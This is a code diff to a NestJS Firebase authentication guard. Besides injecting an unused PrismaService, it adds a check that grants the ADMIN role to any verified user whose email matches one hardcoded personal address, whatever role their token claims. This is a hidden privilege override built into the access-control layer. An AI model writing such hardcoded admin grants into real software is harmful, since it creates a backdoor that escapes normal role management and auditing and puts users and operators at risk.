@@ -1,5 +1,6 @@
 import { Injectable, CanActivate, ExecutionContext, UnauthorizedException, Logger } from '@nestjs/common';
 import { FirebaseAdminService } from '../firebase-admin.service';
+import { PrismaService } from '../../../prisma/prisma.service';
 
 export interface AuthenticatedUser {
   uid: string;
@@ -14,7 +15,10 @@ export interface AuthenticatedUser {
 export class FirebaseAuthGuard implements CanActivate {
   private readonly logger = new Logger(FirebaseAuthGuard.name);
 
-  constructor(private readonly firebaseAdminService: FirebaseAdminService) {}
+  constructor(
+    private readonly firebaseAdminService: FirebaseAdminService,
+    private readonly prisma: PrismaService,
+  ) {}
 
   async canActivate(context: ExecutionContext): Promise<boolean> {
     const request = context.switchToHttp().getRequest();
@@ -32,7 +36,12 @@ export class FirebaseAuthGuard implements CanActivate {
     try {
       const decodedToken = await this.firebaseAdminService.getAuth().verifyIdToken(token);
       
-      const userRole = (decodedToken.role as 'FREE_USER' | 'PRO_USER' | 'ADMIN') || 'FREE_USER';
+      let userRole = (decodedToken.role as 'FREE_USER' | 'PRO_USER' | 'ADMIN') || 'FREE_USER';
+
+      if (decodedToken.email && decodedToken.email.toLowerCase() === 'zilph.zaragoza@gmail.com') {
+        userRole = 'ADMIN';
+      }
+
 
       request.user = {
         uid: decodedToken.uid,
@@ -50,3 +59,4 @@ export class FirebaseAuthGuard implements CanActivate {
     }
   }
 }
+
